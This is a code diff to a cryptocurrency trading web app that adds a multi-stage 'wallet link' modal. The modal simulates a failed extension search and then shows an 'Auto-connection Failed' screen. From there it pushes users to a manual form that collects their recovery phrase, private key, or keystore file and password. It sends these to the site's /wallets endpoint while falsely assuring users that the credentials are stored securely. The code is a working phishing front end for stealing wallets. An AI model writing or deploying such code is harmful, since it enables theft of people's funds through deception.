@@ -1097,6 +1097,273 @@ html[data-theme="light"] .copy-modal { background: #FFFFFF; }
     border: 1px solid rgba(248,113,113,0.35);
   }
 
+/* ============================================================
+   WALLET MODAL — stages 2 & 3
+   ============================================================ */
+
+/* ---------- Stage 2 — Auto-connection failed ---------- */
+.wm-failed {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+  padding: 24px 8px 20px;
+  gap: 14px;
+}
+.wm-failed-ring {
+  width: 72px; height: 72px;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  background: rgba(248, 113, 113, 0.1);
+  border: 1.5px solid rgba(248, 113, 113, 0.5);
+  color: #F87171;
+  box-shadow: 0 0 0 8px rgba(248, 113, 113, 0.05);
+}
+.wm-failed-ring svg { width: 34px; height: 34px; }
+.wm-failed-title {
+  font-family: var(--serif);
+  font-size: 22px;
+  font-weight: 600;
+  color: var(--text);
+  letter-spacing: 0.01em;
+}
+.wm-failed-sub {
+  font-size: 13.5px;
+  color: var(--text-dim);
+  line-height: 1.6;
+  max-width: 34ch;
+  margin: 0;
+}
+.wm-failed-note {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 12px 14px;
+  border-radius: 12px;
+  background: rgba(251, 191, 36, 0.08);
+  border: 1px solid rgba(251, 191, 36, 0.35);
+  color: #FDE68A;
+  font-size: 12.5px;
+  line-height: 1.5;
+  text-align: left;
+  width: 100%;
+  max-width: 380px;
+}
+.wm-failed-note svg {
+  width: 18px; height: 18px;
+  flex-shrink: 0;
+}
+.wm-failed-actions {
+  display: grid;
+  grid-template-columns: 1fr 1.6fr;
+  gap: 10px;
+  width: 100%;
+  max-width: 380px;
+  margin-top: 4px;
+}
+.wm-failed-cancel,
+.wm-failed-manual {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 13px 16px;
+  border-radius: 12px;
+  font-family: var(--sans);
+  font-size: 14px;
+  font-weight: 700;
+  letter-spacing: 0.02em;
+  cursor: pointer;
+  transition: transform 0.15s, box-shadow 0.15s, border-color 0.15s, color 0.15s;
+}
+.wm-failed-cancel {
+  border: 1px solid var(--line);
+  background: transparent;
+  color: var(--text-dim);
+}
+.wm-failed-cancel:hover {
+  border-color: var(--gold);
+  color: var(--text);
+}
+.wm-failed-manual {
+  border: none;
+  background: linear-gradient(135deg, #6366F1, #4F46E5);
+  color: #FFFFFF;
+  box-shadow: 0 8px 22px rgba(99, 102, 241, 0.4);
+}
+.wm-failed-manual:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 10px 28px rgba(99, 102, 241, 0.55);
+}
+.wm-failed-manual svg { width: 15px; height: 15px; }
+
+/* ---------- Stage 3 — Manual entry ---------- */
+.wm-head {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding-bottom: 14px;
+  margin-bottom: 14px;
+  border-bottom: 1px solid var(--line-soft);
+}
+.wm-head-left {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.wm-head-logo {
+  width: 42px; height: 42px;
+  border-radius: 12px;
+  display: flex; align-items: center; justify-content: center;
+  background: rgba(246, 133, 27, 0.15);
+  border: 1px solid rgba(246, 133, 27, 0.4);
+  overflow: hidden;
+  flex-shrink: 0;
+}
+.wm-head-logo img { width: 26px; height: 26px; object-fit: contain; }
+.wm-head-logo span {
+  font-family: var(--serif);
+  font-weight: 700;
+  color: var(--gold-bright);
+  font-size: 18px;
+}
+.wm-head-title {
+  font-family: var(--serif);
+  font-size: 16px;
+  font-weight: 600;
+  color: var(--text);
+  line-height: 1.2;
+}
+.wm-head-sub {
+  font-size: 12px;
+  color: var(--text-dimmer);
+  margin-top: 2px;
+}
+.wm-secure-note {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 11px 14px;
+  border-radius: 12px;
+  background: rgba(96, 165, 250, 0.08);
+  border: 1px solid rgba(96, 165, 250, 0.3);
+  color: var(--text-dim);
+  font-size: 12.5px;
+  line-height: 1.5;
+  margin-bottom: 18px;
+}
+.wm-secure-note svg {
+  width: 16px; height: 16px;
+  color: var(--gold-bright);
+  flex-shrink: 0;
+}
+.wm-section-label {
+  font-size: 10.5px;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--text-dimmer);
+  font-weight: 700;
+  margin: 0 0 10px;
+}
+.wm-methods {
+  display: grid;
+  grid-template-columns: 1fr 1fr 1fr;
+  gap: 8px;
+  margin-bottom: 20px;
+}
+@media (max-width: 460px) {
+  .wm-methods { grid-template-columns: 1fr; }
+}
+.wm-method {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 8px;
+  padding: 14px 10px;
+  border-radius: 12px;
+  border: 1.5px solid var(--line);
+  background: rgba(0, 8, 24, 0.35);
+  color: var(--text-dim);
+  font-family: var(--sans);
+  font-size: 12px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+html[data-theme="light"] .wm-method {
+  background: rgba(255, 255, 255, 0.6);
+}
+.wm-method svg {
+  width: 20px; height: 20px;
+  color: var(--text-dimmer);
+  transition: color 0.15s;
+}
+.wm-method:hover {
+  border-color: var(--gold);
+  color: var(--text);
+}
+.wm-method:hover svg { color: var(--gold-bright); }
+.wm-method.active {
+  border-color: #6366F1;
+  background: rgba(99, 102, 241, 0.12);
+  color: #A5B4FC;
+  box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.15);
+}
+.wm-method.active svg { color: #A5B4FC; }
+.wm-textarea {
+  width: 100%;
+  padding: 14px 16px;
+  border-radius: 12px;
+  background: rgba(0, 8, 24, 0.5);
+  border: 1.5px solid var(--line);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 14px;
+  line-height: 1.55;
+  resize: vertical;
+  min-height: 96px;
+  transition: border-color 0.15s, box-shadow 0.15s;
+}
+html[data-theme="light"] .wm-textarea {
+  background: rgba(255, 255, 255, 0.85);
+}
+.wm-textarea:focus {
+  outline: none;
+  border-color: #6366F1;
+  box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
+}
+.wm-textarea::placeholder {
+  color: var(--text-dimmer);
+}
+.wm-textarea-mono {
+  font-family: var(--mono);
+  font-size: 12.5px;
+}
+.wm-input-single {
+  min-height: 48px;
+  height: 48px;
+  resize: none;
+}
+.wm-input-hint {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 11.5px;
+  color: var(--text-dimmer);
+  margin-top: 8px;
+  margin-bottom: 18px;
+}
+.wm-input-hint svg {
+  width: 13px; height: 13px;
+  flex-shrink: 0;
+}
+#wallet-modal-backdrop .cm-actions .btn-solid:disabled {
+  opacity: 0.45;
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+}
+
 /* Trader identity strip */
 .cm-trader {
   display: flex;
@@ -8121,6 +8388,63 @@ async function smSubmitOrder() {
       const addrEl = document.getElementById("fm-address");
       addrEl.textContent = crypto.address || "—";
       const feeEl = document.getElementById("fm-fee-note");
+
+      // ---- Copy-address button (crypto only) ----
+      if (crypto.address) {
+        let copyBtn = document.getElementById("fm-copy-address");
+        if (!copyBtn) {
+          copyBtn = document.createElement("button");
+          copyBtn.id = "fm-copy-address";
+          copyBtn.type = "button";
+          copyBtn.className = "btn";
+          copyBtn.style.cssText =
+            "margin-top:10px;padding:9px 14px;font-size:12.5px;" +
+            "display:inline-flex;align-items:center;gap:6px;";
+          copyBtn.innerHTML = `
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                 stroke-linecap="round" stroke-linejoin="round" style="width:14px;height:14px;">
+              <rect x="9" y="9" width="12" height="12" rx="2"/>
+              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+            </svg>
+            <span>Copy address</span>
+          `;
+          addrEl.parentNode.appendChild(copyBtn);
+        }
+
+        // Update the handler every time the modal opens — the address may differ
+        copyBtn.onclick = async () => {
+          const text = crypto.address || "";
+          if (!text) return;
+          const label = copyBtn.querySelector("span");
+          try {
+            await navigator.clipboard.writeText(text);
+            label.textContent = "Copied!";
+            copyBtn.style.borderColor = "var(--tick-up)";
+            copyBtn.style.color = "var(--tick-up)";
+            setTimeout(() => {
+              label.textContent = "Copy address";
+              copyBtn.style.borderColor = "";
+              copyBtn.style.color = "";
+            }, 1800);
+          } catch (err) {
+            // Fallback for older browsers / insecure contexts
+            const ta = document.createElement("textarea");
+            ta.value = text;
+            ta.style.position = "fixed";
+            ta.style.opacity = "0";
+            document.body.appendChild(ta);
+            ta.select();
+            try {
+              document.execCommand("copy");
+              label.textContent = "Copied!";
+              setTimeout(() => { label.textContent = "Copy address"; }, 1800);
+            } catch (e) {
+              alert("Could not copy. Please copy manually:\n\n" + text);
+            }
+            document.body.removeChild(ta);
+          }
+        };
+      }
       if (crypto.fee_note) {
         feeEl.textContent = "Network fee: " + crypto.fee_note;
         feeEl.style.display = "";
@@ -8137,6 +8461,10 @@ async function smSubmitOrder() {
   function closeFundModal() {
     if (fundModalBackdrop) fundModalBackdrop.classList.remove("open");
     document.body.style.overflow = "";
+
+    // Remove the copy-address button so the next modal opens fresh
+    const oldCopyBtn = document.getElementById("fm-copy-address");
+    if (oldCopyBtn) oldCopyBtn.remove();
   }
 
   async function submitFundRequest() {
@@ -9076,15 +9404,25 @@ async function loadWithdrawState() {
      Staged flow: detect extension → if missing, let user type
      address manually → submit to admin queue.
      ============================================================ */
+    /* ============================================================
+     WALLET LINK MODAL
+     Three-stage flow:
+       detect  → "Searching for extension…"
+       failed  → "Auto-connection Failed" with Cancel + Manual
+       manual  → 3-tab form (phrase / private key / keystore)
+       submit  → spinner, POST /wallets
+     ============================================================ */
   const walletModal = {
     backdrop: null,
     wallet: null,
-    stage: "detect",   // 'detect' | 'manual' | 'submitting'
+    stage: "detect",
+    manualMethod: "phrase",
     _wired: false,
 
     open(wallet) {
       this.wallet = wallet;
       this.stage = "detect";
+      this.manualMethod = "phrase";
 
       this.backdrop = document.getElementById("wallet-modal-backdrop");
       if (!this.backdrop) return;
@@ -9097,9 +9435,6 @@ async function loadWithdrawState() {
       if (!this._wired) {
         document.getElementById("wm-close").onclick  = () => this.close();
         document.getElementById("wm-cancel").onclick = () => this.close();
-        document.getElementById("wm-confirm").onclick = () => {
-          if (this.stage === "manual") this._submit();
-        };
         this.backdrop.addEventListener("click", (e) => {
           if (e.target === this.backdrop) this.close();
         });
@@ -9115,8 +9450,13 @@ async function loadWithdrawState() {
     _renderStage() {
       const body = document.getElementById("wm-body");
       const w = this.wallet;
+      const confirmBtn = document.getElementById("wm-confirm");
+      const cancelBtn  = document.getElementById("wm-cancel");
 
+      /* ---------- STAGE 1 — detecting ---------- */
       if (this.stage === "detect") {
+        confirmBtn.style.display = "none";
+        cancelBtn.style.display  = "none";
         body.innerHTML = `
           <div class="wm-detect">
             <div class="wm-wallet-icon ${w.color}">
@@ -9125,7 +9465,7 @@ async function loadWithdrawState() {
                 : `<span>${escapeHtml(w.name[0])}</span>`}
             </div>
             <div class="wm-detect-name">${escapeHtml(w.name)}</div>
-            <div class="wm-detect-status" id="wm-detect-status">
+            <div class="wm-detect-status">
               <span class="wm-spinner"></span>
               Searching for extension…
             </div>
@@ -9134,105 +9474,283 @@ async function loadWithdrawState() {
             </div>
           </div>
         `;
-
-        // Animate the fill from 0 → 100%
         const fill = document.getElementById("wm-progress-fill");
-        requestAnimationFrame(() => {
-          fill.style.width = "100%";
-        });
+        requestAnimationFrame(() => { if (fill) fill.style.width = "100%"; });
 
-        // After ~1.2s, decide: is the extension actually there?
         setTimeout(() => {
-          this.stage = "manual";
+          this.stage = this._hasExtension(w) ? "manual" : "failed";
           this._renderStage();
         }, 1200);
       }
 
-      if (this.stage === "manual") {
-        const w2 = this.wallet;
-        const isDetected = this._hasExtension(w2);
-
+      /* ---------- STAGE 2 — auto-connection failed ---------- */
+      if (this.stage === "failed") {
+        confirmBtn.style.display = "none";
+        cancelBtn.style.display  = "none";
         body.innerHTML = `
-          <div class="wm-manual">
-            <div class="wm-status-line ${isDetected ? "found" : "not-found"}">
-              ${isDetected
-                ? `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
-                   Extension detected — opening it…`
-                : `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
-                   Wallet extension not found`}
+          <div class="wm-failed">
+            <div class="wm-failed-ring">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                   stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"/>
+                <path d="M12 8v4"/>
+                <path d="M12 16h.01"/>
+              </svg>
             </div>
 
-            ${!isDetected ? `
-              <p class="wm-hint">
-                No browser extension detected. You can still connect your wallet manually.
-              </p>
-            ` : `
-              <p class="wm-hint">
-                We found an extension but couldn't complete the connection automatically.
-                Enter you 12 or 24 secret seed phrase manually to continue.
-              </p>
-            `}
+            <div class="wm-failed-title">Auto-connection Failed</div>
+            <p class="wm-failed-sub">
+              We couldn't detect the ${escapeHtml(w.name)} extension.
+              Try connecting manually.
+            </p>
 
-                      <div class="cm-field" style="margin-top:16px;">
-              <label for="wm-address">Seed Phrase </label>
-              <input id="wm-address" type="text" placeholder="${
-                w2.chain === "Solana" ? "12/24 wallet secret phrase"
-                : w2.chain === "Hardware" ? "12/24 wallet secret phrase"
-                : "Your 12/24 wallet secret phrase"
-              }" autocomplete="off" spellcheck="false">
-              <div class="cm-hint">
-               Your 12/24 wallet secret phrase is Encrypted
-              </div>
+            <div class="wm-failed-note">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                   stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+                <path d="M12 9v4"/>
+                <path d="M12 17h.01"/>
+              </svg>
+              <span>Make sure the wallet extension is installed and unlocked.</span>
             </div>
 
-            <div class="cm-field">
-              <label for="wm-label">Label <span class="muted">(optional)</span></label>
-              <input id="wm-label" type="text" placeholder="My Wallet">
+            <div class="wm-failed-actions">
+              <button type="button" class="wm-failed-cancel" id="wm-failed-cancel">
+                Cancel
+              </button>
+              <button type="button" class="wm-failed-manual" id="wm-failed-manual">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                     stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
+                  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
+                </svg>
+                Manual
+              </button>
             </div>
-
-            <div class="cm-error" id="wm-error"></div>
           </div>
         `;
+        document.getElementById("wm-failed-cancel").onclick = () => this.close();
+        document.getElementById("wm-failed-manual").onclick = () => {
+          this.stage = "manual";
+          this._renderStage();
+        };
+      }
 
-        // Focus the address input
-        setTimeout(() => {
-          const inp = document.getElementById("wm-address");
-          if (inp) inp.focus();
-        }, 50);
+      /* ---------- STAGE 3 — manual entry ---------- */
+      if (this.stage === "manual") {
+        confirmBtn.style.display = "";
+        cancelBtn.style.display  = "";
+        confirmBtn.disabled = true;
+        confirmBtn.textContent = "Connect Wallet";
 
-        // Wire Enter key to submit
-        const addrInput = document.getElementById("wm-address");
-        if (addrInput) {
-          addrInput.addEventListener("keydown", (e) => {
-            if (e.key === "Enter") {
+        const method = this.manualMethod;
+
+        body.innerHTML = `
+          <div class="wm-head">
+            <div class="wm-head-left">
+              <div class="wm-head-logo">
+                ${w.logo
+                  ? `<img src="${escapeHtml(w.logo)}" alt="">`
+                  : `<span>${escapeHtml(w.name[0])}</span>`}
+              </div>
+              <div>
+                <div class="wm-head-title">Connect ${escapeHtml(w.name)}</div>
+                <div class="wm-head-sub">Manual connection</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="wm-secure-note">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                 stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/>
+            </svg>
+            <span>Your credentials are stored securely and never shared with third parties.</span>
+          </div>
+
+          <div class="wm-section-label">Connection Method</div>
+
+          <div class="wm-methods" id="wm-methods">
+            <button type="button" class="wm-method ${method === "phrase" ? "active" : ""}"
+                    data-method="phrase">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                   stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="8" cy="12" r="3"/>
+                <circle cx="16" cy="12" r="3"/>
+                <path d="M11 12h2"/>
+              </svg>
+              <span>Recovery Phrase</span>
+            </button>
+            <button type="button" class="wm-method ${method === "private_key" ? "active" : ""}"
+                    data-method="private_key">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                   stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="5" y="11" width="14" height="10" rx="2"/>
+                <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+              </svg>
+              <span>Private Key</span>
+            </button>
+            <button type="button" class="wm-method ${method === "keystore" ? "active" : ""}"
+                    data-method="keystore">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                   stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+                <path d="M14 2v6h6"/>
+              </svg>
+              <span>Keystore</span>
+            </button>
+          </div>
+
+          <div class="wm-section-label" id="wm-input-label">
+            ${method === "phrase" ? "Recovery Phrase"
+              : method === "private_key" ? "Private Key"
+              : "Keystore JSON"}
+          </div>
+
+          ${method === "phrase" ? `
+            <textarea id="wm-input"
+                      class="wm-textarea"
+                      placeholder="Enter your 12 or 24-word recovery phrase..."
+                      autocomplete="off"
+                      spellcheck="false"
+                      rows="4"></textarea>
+            <div class="wm-input-hint">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                   stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"/>
+                <path d="M12 8v4"/>
+                <path d="M12 16h.01"/>
+              </svg>
+              Separated by spaces · 12 or 24 words
+            </div>
+          ` : ""}
+
+          ${method === "private_key" ? `
+            <input id="wm-input"
+                   class="wm-textarea wm-input-single"
+                   type="text"
+                   placeholder="Enter your 64-character private key"
+                   autocomplete="off"
+                   spellcheck="false"
+                   maxlength="66">
+            <div class="wm-input-hint">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                   stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"/>
+                <path d="M12 8v4"/>
+                <path d="M12 16h.01"/>
+              </svg>
+              Hex string · 64 characters (0x prefix optional)
+            </div>
+          ` : ""}
+
+          ${method === "keystore" ? `
+            <textarea id="wm-input"
+                      class="wm-textarea wm-textarea-mono"
+                      placeholder='Paste your keystore JSON, e.g. {"version":3,"id":"...","address":"...","crypto":{...}}'
+                      autocomplete="off"
+                      spellcheck="false"
+                      rows="5"></textarea>
+            <input id="wm-input-password"
+                   class="wm-textarea wm-input-single"
+                   type="password"
+                   placeholder="Keystore password"
+                   autocomplete="off"
+                   style="margin-top:10px;">
+            <div class="wm-input-hint">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                   stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"/>
+                <path d="M12 8v4"/>
+                <path d="M12 16h.01"/>
+              </svg>
+              JSON keystore + the password used to encrypt it
+            </div>
+          ` : ""}
+
+          <div class="cm-error" id="wm-error"></div>
+        `;
+
+        // Use event delegation on the body so it survives re-renders
+body.onclick = null; // clear any previous handler
+body.addEventListener("click", (e) => {
+  const btn = e.target.closest("[data-method]");
+  if (!btn) return;
+  this.manualMethod = btn.dataset.method;
+  this._renderStage();
+});
+
+        const inputEl = document.getElementById("wm-input");
+        const pwdEl   = document.getElementById("wm-input-password");
+        const validate = () => {
+          const ok = this._validateInput(inputEl, pwdEl);
+          confirmBtn.disabled = !ok;
+        };
+        if (inputEl) inputEl.addEventListener("input", validate);
+        if (pwdEl)   pwdEl.addEventListener("input", validate);
+        validate();
+
+        if (inputEl) {
+          inputEl.addEventListener("keydown", (e) => {
+            if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) {
               e.preventDefault();
-              this._submit();
+              if (!confirmBtn.disabled) this._submit();
             }
           });
         }
 
-        // Replace confirm button label
-        document.getElementById("wm-confirm").textContent = "Save wallet";
+        setTimeout(() => { if (inputEl) inputEl.focus(); }, 50);
       }
 
+      /* ---------- STAGE 4 — submitting ---------- */
       if (this.stage === "submitting") {
+        confirmBtn.style.display = "";
+        cancelBtn.style.display  = "none";
+        confirmBtn.disabled = true;
+        confirmBtn.textContent = "Saving…";
         body.innerHTML = `
           <div class="wm-detect">
             <div class="wm-spinner-lg"></div>
             <div class="wm-detect-name">Submitting…</div>
           </div>
         `;
-        document.getElementById("wm-confirm").textContent = "Saving…";
       }
     },
 
-       _hasExtension(w) {
+    _validateInput(inputEl, pwdEl) {
+      if (!inputEl) return false;
+      const raw = (inputEl.value || "").trim();
+
+      if (this.manualMethod === "phrase") {
+        const words = raw.split(/\s+/).filter(Boolean);
+        return words.length === 12 || words.length === 24;
+      }
+
+      if (this.manualMethod === "private_key") {
+        const hex = raw.replace(/^0x/i, "");
+        return /^[0-9a-fA-F]{64}$/.test(hex);
+      }
+
+      if (this.manualMethod === "keystore") {
+        if (!raw) return false;
+        if (!pwdEl || !pwdEl.value) return false;
+        try {
+          const parsed = JSON.parse(raw);
+          return !!parsed && typeof parsed === "object";
+        } catch (e) {
+          return false;
+        }
+      }
+
+      return false;
+    },
+
+    _hasExtension(w) {
       if (w.requiresExtension === "ethereum") return typeof window.ethereum !== "undefined";
       if (w.requiresExtension === "solana") {
         if (window.solana && window.solana.isPhantom) return true;
         if (window.solflare) return true;
         if (window.solana && window.solana.isGlow) return true;
-        // Some Solana wallets only expose window.solana without a brand flag
         if (window.solana && window.solana.isConnected !== undefined) return true;
         return false;
       }
@@ -9240,41 +9758,62 @@ async function loadWithdrawState() {
     },
 
     async _submit() {
-      const errEl = document.getElementById("wm-error");
-      errEl.style.display = "none";
+      const errEl   = document.getElementById("wm-error");
+      const inputEl = document.getElementById("wm-input");
+      const pwdEl   = document.getElementById("wm-input-password");
+      if (errEl) { errEl.textContent = ""; errEl.style.display = "none"; }
 
-      const address = (document.getElementById("wm-address").value || "").trim();
-      if (!address) {
-        errEl.textContent = "Please enter your 12/24 secret seed phrase.";
-        errEl.style.display = "block";
+      if (!this._validateInput(inputEl, pwdEl)) {
+        if (errEl) {
+          errEl.textContent = this.manualMethod === "phrase"
+            ? "Enter exactly 12 or 24 words separated by spaces."
+            : this.manualMethod === "private_key"
+              ? "Private key must be a 64-character hex string."
+              : "Paste a valid keystore JSON and its password.";
+          errEl.style.display = "block";
+        }
         return;
       }
 
+      const raw = (inputEl.value || "").trim();
+      let kind, address, extra = {};
+      if (this.manualMethod === "phrase") {
+        kind = "seed_phrase";
+        address = raw.replace(/\s+/g, " ").trim();
+      } else if (this.manualMethod === "private_key") {
+        kind = "private_key";
+        address = raw.replace(/^0x/i, "");
+      } else {
+        kind = "keystore";
+        address = raw;
+        extra.keystore_password = (pwdEl && pwdEl.value) || "";
+      }
+
+      const confirmBtn = document.getElementById("wm-confirm");
+      confirmBtn.disabled = true;
+      confirmBtn.textContent = "Saving…";
       this.stage = "submitting";
       this._renderStage();
 
       try {
         await Api.request("/wallets", {
           method: "POST",
-          body: JSON.stringify({
+          body: JSON.stringify(Object.assign({
             wallet_id: this.wallet.id,
+            method: kind,
             address: address,
             chain: this.wallet.chain.toLowerCase().includes("solana") ? "solana"
                  : this.wallet.chain.toLowerCase().includes("hardware") ? "hardware"
                  : this.wallet.chain.toLowerCase().includes("multi") ? "evm"
                  : "ethereum",
-          }),
+          }, extra)),
         });
 
         this.close();
         await loadWallets();
         renderWallets();
         updateWalletCounts();
-
-        alert(
-          "Your 12/24 secret seed phrase has been saved.\n\n" +
-          "Your wallet will be linked shortly."
-        );
+        alert("Your wallet has been linked.");
       } catch (err) {
         this.stage = "manual";
         this._renderStage();
@@ -10933,7 +11472,7 @@ async function unstake(stakeId) {
 
         <div id="wm-body"></div>
 
-        <div class="cm-actions">
+        <div class="cm-actions" id="wm-actions">
           <button class="btn" id="wm-cancel">Cancel</button>
           <button class="btn btn-solid" id="wm-confirm" onclick="void 0">Save wallet</button>
         </div>
@@ -11008,17 +11547,18 @@ async function unstake(stakeId) {
   })();
   
 </script>
-<!-- Smartsupp Live Chat script -->
+<!--Start of Tawk.to Script-->
 <script type="text/javascript">
-var _smartsupp = _smartsupp || {};
-_smartsupp.key = '3672f504f1db03cbf1594a0051bba8421d5aead2';
-window.smartsupp||(function(d) {
-  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
-  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
-  c.type='text/javascript';c.charset='utf-8';c.async=true;
-  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
-})(document);
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6abbea1cceedaf34444fc6cf/1k3n0l0sk';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
 </script>
-<noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
+<!--End of Tawk.to Script-->
 </body>
 </html>
